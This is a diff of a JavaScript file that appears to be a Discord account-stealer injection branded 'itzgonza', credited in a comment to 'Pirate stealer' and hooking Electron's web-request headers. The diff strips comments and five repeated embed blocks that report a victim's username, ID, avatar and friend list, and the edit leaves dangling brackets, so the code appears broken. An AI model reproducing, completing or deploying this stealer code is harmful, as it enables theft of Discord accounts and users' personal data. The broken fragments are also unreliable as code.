@@ -7,9 +7,6 @@ const https = require('https');
 const querystring = require("querystring");
 const fs = require("fs");
 
-
-// Initialization
-
 var config = {
     brand: "itzgonza",
 
@@ -147,8 +144,6 @@ class Event {
         }
     }
 }
-
-// Traffic recording (Pirate stealer inspiration)
 
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
     try {
@@ -311,16 +306,7 @@ var event_handlers = {
                         inline: false
                     },
                 ],
-            }), createEmbed({
-                description: `**Total Friends (${friends['length']})**\n\n${friends.frien}`,
-                thumbnail: {
-                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
-                },
-                author: {
-                    name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                    url: config.embed.href,
-                    icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
-                },
+            }),
             })]
         }
 
@@ -384,16 +370,7 @@ var event_handlers = {
                         inline: false
                     },
                 ],
-            }), createEmbed({
-                description: `**Total Friends (${friends['length']})**\n\n${friends.frien}`,
-                thumbnail: {
-                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
-                },
-                author: {
-                    name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                    url: config.embed.href,
-                    icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
-                },
+            }),
             })]
         }
 
@@ -457,16 +434,7 @@ var event_handlers = {
                         inline: false
                     },
                 ],
-            }), createEmbed({
-                description: `**Total Friends (${friends['length']})**\n\n${friends.frien}`,
-                thumbnail: {
-                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
-                },
-                author: {
-                    name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                    url: config.embed.href,
-                    icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
-                },
+            }),
             })]
         }
 
@@ -530,16 +498,7 @@ var event_handlers = {
                         inline: false
                     },
                 ],
-            }), createEmbed({
-                description: `**Total Friends (${friends['length']})**\n\n${friends.frien}`,
-                thumbnail: {
-                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
-                },
-                author: {
-                    name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                    url: config.embed.href,
-                    icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
-                },
+            }),
             })]
         }
 
@@ -762,16 +721,7 @@ async function initialize() {
                                 inline: false
                             }
                         ],
-                    }), createEmbed({
-                        description: `**Total Friends (${friends['length']})**\n\n${friends.frien}`,
-                        thumbnail: {
-                            url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
-                        },
-                        author: {
-                            name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                            url: config.embed.href,
-                            icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
-                        },
+                    }),
                     })]
                 })
             }
